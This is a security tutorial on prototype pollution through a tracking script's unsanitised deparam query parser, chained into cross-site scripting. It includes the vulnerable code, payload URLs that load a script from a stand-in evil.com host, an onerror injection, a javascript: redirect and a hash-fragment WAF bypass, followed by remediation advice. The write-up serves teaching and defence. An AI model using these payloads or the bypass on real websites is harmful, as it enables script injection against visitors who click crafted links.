Prototype Pollution via deparam to XSS Chain

Inspired by matanber's prototype pollution & CSPT research · Affects every site loading the tracking script

Vulnerability

A widely-deployed tracking script contains a deparam function that parses URL query parameters into a JavaScript object without sanitizing property names. By crafting a URL with __proto__[property]=value, an attacker can pollute Object.prototype and inject properties that flow into script gadgets, achieving XSS on any website loading the script.

Understanding Prototype Pollution

In JavaScript, every object inherits from Object.prototype. If an attacker can set a property on Object.prototype, that property becomes available on every object in the application:

// Normal behavior
const obj = {};
console.log(obj.isAdmin); // undefined

// After prototype pollution
Object.prototype.isAdmin = true;
console.log(obj.isAdmin); // true (!!)

// This affects ALL objects, including ones created later
const newObj = {};
console.log(newObj.isAdmin); // true

The Vulnerable deparam Function

The tracking script's deparam function converts URL query strings into nested objects. It processes bracket notation (a[b][c]=value) but doesn't filter __proto__ or constructor:

function deparam(queryString) {
  var obj = {};
  var pairs = queryString.split('&');

  pairs.forEach(function(pair) {
    var parts = pair.split('=');
    var key = decodeURIComponent(parts[0]);
    var value = decodeURIComponent(parts[1] || '');

    // Handles nested keys like a[b][c]
    var keys = key.replace(/\]/g, '').split('[');
    var current = obj;

    for (var i = 0; i < keys.length - 1; i++) {
      var k = keys[i];
      if (!current[k]) current[k] = {};
      current = current[k]; // When k is "__proto__", this is Object.prototype!
    }

    current[keys[keys.length - 1]] = value;
  });

  return obj;
}

// Attacker crafts URL:
// https://target.com/?__proto__[polluted]=true
deparam("__proto__[polluted]=true");
console.log({}.polluted); // "true" - POLLUTION CONFIRMED

From Pollution to XSS: Script Gadgets

Prototype pollution alone isn't exploitable — you need a "gadget" that reads the polluted property and uses it in a dangerous sink. Common gadgets:

Gadget 1: Dynamic Script Loading

// Application code that loads a script based on config
function loadAnalytics(config) {
  var src = config.scriptSrc || '/js/analytics.js';
  var script = document.createElement('script');
  script.src = src;
  document.head.appendChild(script);
}

// Normal call - config has no scriptSrc, uses default
loadAnalytics({});

// After pollution: ?__proto__[scriptSrc]=https://evil.com/xss.js
// config.scriptSrc is now "https://evil.com/xss.js" (inherited!)
loadAnalytics({}); // Loads attacker's script!

Gadget 2: innerHTML via Template

// Code that builds HTML from config properties
function renderWidget(options) {
  var html = options.template || '<div>Default</div>';
  document.getElementById('widget').innerHTML = html;
}

// After pollution: ?__proto__[template]=<img src=x onerror=alert(1)>
renderWidget({}); // XSS!

Gadget 3: URL Construction

// Code that builds a URL from config
function redirect(config) {
  var base = config.baseUrl || 'https://target.com';
  window.location = base + '/dashboard';
}

// After pollution: ?__proto__[baseUrl]=javascript://
redirect({}); // javascript:///dashboard - JS execution!

The Full Chain

Step 1: Tracking script's deparam parses URL params without filtering __proto__

Step 2: Attacker crafts URL: https://target.com/?__proto__[scriptSrc]=//evil.com/xss.js

Step 3: Application code reads config.scriptSrc from an empty object, inherits the polluted value

Step 4: Attacker's script loads and executes in the context of the target domain

WAF Bypass: Hash Fragment

The tracking script also parses location.hash (the URL fragment after #). Since hash fragments are never sent to the server, WAFs and server-side filters can't see them:

// WAF blocks this (query string reaches the server):
https://target.com/?__proto__[test]=1
// WAF: "Blocked - suspicious parameter name"

// WAF can't see this (hash never reaches server):
https://target.com/#__proto__[test]=1
// WAF: nothing to inspect!

// The tracking script parses both:
var params = deparam(location.search.substring(1));
var hashParams = deparam(location.hash.substring(1)); // WAF-invisible!

Why It Matters

This tracking script is loaded on thousands of websites. Prototype pollution via the URL is a one-click attack — the victim just needs to click a crafted link. The hash-based variant bypasses all server-side security. Combined with a script gadget on the target page, this becomes reflected XSS at scale with no WAF detection possible.

Bug Bounty Tip

To find prototype pollution: (1) Search JS files for deparam, $.extend (deep), merge, assign with recursive/deep options. (2) Test with ?__proto__[testpollution]=1 and check {}.testpollution in console. (3) If pollution works, search for gadgets: look for code that reads properties from empty objects with || defaults, like config.src || 'default'. (4) Tools: ppmap automates gadget discovery. (5) Always try the hash variant for WAF bypass.

Remediation

  • Filter __proto__, constructor, and prototype in any object-building function
  • Use Object.create(null) for config objects (no prototype chain)
  • Freeze Object.prototype in critical applications
  • Use Map instead of plain objects for user-controlled key-value pairs
  • Validate that property names don't contain prototype-related keywords
